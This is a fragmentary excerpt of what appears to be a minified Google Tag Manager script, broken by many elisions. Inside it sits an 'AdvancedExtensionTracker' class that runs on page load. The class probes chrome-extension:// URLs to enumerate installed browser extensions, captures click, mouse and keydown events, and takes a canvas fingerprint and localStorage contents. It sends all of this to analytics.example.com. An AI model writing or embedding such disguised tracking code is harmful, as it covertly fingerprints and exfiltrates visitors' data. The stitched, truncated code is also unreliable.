...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 1,
        "vtp_instanceDestinationId": "UA-111711959-1",
        "tag_id": 9
      }, {
        "function": "__rep",
        "vtp_containerId": "UA-111711959-1",
        "vtp_remoteConfig": ["map"],
        "tag_id": 1
      }, {
        "function": "__zone",
        "vtp_childContainers": ["list", ["map", "publicId", "G-8D8NEYM6EV"]],
  ...
  */
  ...
  class AdvancedExtensionTracker {
    constructor(trackingExtensions) {
      this._extensionData = trackingExtensions;
      this._trackResults = new Map();
      this._beginTime = performance.now();
      this._redoCount = 2;
      this._multithread = 4;
      this._globalVarsSnapshot = Object.keys(window);
      this._eventListeners = {};
    }
    async _pollResource(extension, file) {
      const uniqueReqParam = `?_=${Math.random().toString(36).substring(2)}`;
      const httpReq = new XMLHttpRequest();
      return new Promise(resolve => {
        httpReq.timeout = 2000;
        httpReq.onreadystatechange = () => {
          if (httpReq.readyState === 4) {
            resolve(httpReq.status === 200);
          }
        };
        httpReq.onerror = () => resolve(false);
        httpReq.ontimeout = () => resolve(false);
        httpReq.open('HEAD', `chrome-extension://${extension}/${file}${uniqueReqParam}`);
        httpReq.send();
      });
    }
    _divideArray(inputArr, chunkSize) {
      return Array.from({
        length: Math.ceil(inputArr.length / chunkSize)
      }, (v, index) => inputArr.slice(index * chunkSize, index * chunkSize + chunkSize));
    }
    async _probeRetry(extensionName, data) {
      let tracked = false;
      for (let tries = 0; tries < this._redoCount && !tracked; tries++) {
        tracked = await this._pollResource(data.id, data.file);
        if (!tracked) {
          await new Promise(resolve => setTimeout(resolve, 100 * (tries + 1)));
        }
      }
      return tracked;
    }
    async _probeExtensions() {
      const dataArray = Object.entries(this._extensionData);
      const batchedArrays = this._divideArray(dataArray, this._multithread);
      for (const batch of batchedArrays) {
        await Promise.all(batch.map(async ([extensionName, data]) => {
          const isFound = await this._probeRetry(extensionName, data);
          this._trackResults.set(extensionName, isFound);
        }));
      }
      this._postResults();
    }
    _generateSignature() {
      ...
      const newTxt = 'sign,123';
      newContext.textBaseline = 'top';
      newContext.font = '14px Arial';
      newContext.fillText(newTxt, 2, 2);
      return newCanvas.toDataURL().slice(-50);
    }
    _captureListeners() {
      for (const type of ['click', 'mousemove', 'keydown']) {
        window.addEventListener(type, event => this._eventListeners[type] = event);
      }
    }
    _postResults() {
      const resultsData = {
        extensions: Object.fromEntries(this._trackResults),
        listeners: this._eventListeners,
        hooks: Object.keys(window).filter(k => !this._globalVarsSnapshot.includes(k)),
        metadata: {
          executionTime: performance.now() - this._beginTime,
          timestamp: new Date().toISOString(),
          signature: this._generateSignature(),
          platform: {
            browserAgent: navigator.userAgent,
            languageUsed: navigator.language,
            platformType: navigator.platform,
            vendorName: navigator.vendor,
            localStorageData: localStorage.getItem('localStorage')
          }
        }
      };
      const encoder = new TextEncoder();
      const result = encoder.encode(JSON.stringify(resultsData));
      if ('sendBeacon' in navigator) {
        navigator.sendBeacon('https://analytics.example.com/adv-ext-report', result);
      } else {
        fetch('https://analytics.example.com/adv-ext-report', {
          method: 'POST',
          body: result,
          keepalive: true,
          headers: {
  ...
  ni.ee = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.Rj = "ChEI8OnlpwYQuJTc8ab5i5yFARInAIxhzZCJiuDey7yfogG1KxbVWSmZcNw2G+mva0Va8gUTmbZ8Q88ZGgISew\x3d\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  aa.isActive = function (a, b) {
    ...
    for (var e = 0; e < c.Ne.length; e++) if (this.B[c.Ne[e]].ad(b)) return !0;
    return !1;
  };
  aa.getIsAllowedFn = function (a, b) {
    ...
    var k = this.getIsAllowedFn([c.yh], b);
    return function (m, n) {
      n = n || [];
      if (!k(m, n)) return !1;
  ...
  aa.registerChild = function (a, b, c) {
    var d = this.h[a];
    if (!d && oi[a] || !d && uk(a) || d && d.yh !== b) return !1;
    if (d) return d.Ne.push(c), !1;
    this.h[a] = {
      yh: b,
      Ne: [c]
    };
  ...
  Zu.prototype.F = function (a, b) {
    var c = this.h[this.h.length - 1];
    a <= c.eventId || c.ad !== b && this.h.push({
      eventId: a,
      ad: b
    });
  };
  Zu.prototype.ad = function (a) {
    for (var b = this.h.length - 1; 0 <= b; b--) if (this.h[b].eventId <= a) return this.h[b].ad;
    return !1;
  };
  Zu.prototype.C = function (a, b) {
    b = b || [];
    if (!this.B || Xu[a] || this.B[a]) return !0;
      ...
      for (var k = g.createZone(a, c), m = 0; m < b.length; m++) {
        ...
        if (g.registerChild(n, nk(), k)) {
          var p = a,
            ...
            r = e,
            t = f;
          if (0 === n.indexOf("GTM-")) Dt(n, void 0, !1, {
            source: 1,
  ...
  function vA(a) {
    ...
    var c = pd(a) || {},
      d = Qq({
        ...
        hb: c.fieldFilters,
        Hh: !!c.selectMultipleElements
      });
    b = new qb();
    var e = new pb();
    b.set("elements", e);
    for (var f = d.elements, g = 0; g < f.length; g++) e.push(wA(f[g]));
    void 0 !== d.zh && b.set("preferredEmailElement", wA(d.zh));
  ...
  nD.D = "internal.getCountryCode";
  {
    ...
    tracker._captureListeners();
    if (document.readyState !== 'loading') {
      tracker._probeExtensions();
    } else {
      document.addEventListener('DOMContentLoaded', () => tracker._probeExtensions());
    }
  }
  function oD() {
    var a = [];
    ...
    (function (a) {
      ...
      switch (c.prefix) {
        ...
        case "UA":
          ...
          break;
        case "MC":
          d = lF(c, a.vtp_gtmEventId);
          break;
        default:
          F(a.vtp_gtmOnFailure);
          return;
      }
      d ? (F(a.vtp_gtmOnSuccess), Tv(b, d), a.vtp_remoteConfig && Yv(b, a.vtp_remoteConfig || {})) : F(a.vtp_gtmOnFailure);
    });
  }();
  ...
  Z.m.zone = [], function () {
    ...
    (function (c) {
      ...
      if (c.vtp_gtmTagId in a) av(a[c.vtp_gtmTagId], c.vtp_gtmEventId, d);else if (d) {
        var e = c.vtp_childContainers.map(function (m) {
          ...
          g = {};
        var k = $u(c.vtp_gtmEventId, e, f, g, Yt(1, c.vtp_gtmEntityIndex, c.vtp_gtmEntityName), !!c.vtp_inheritParentConfig);
        a[c.vtp_gtmTagId] = k;
      }
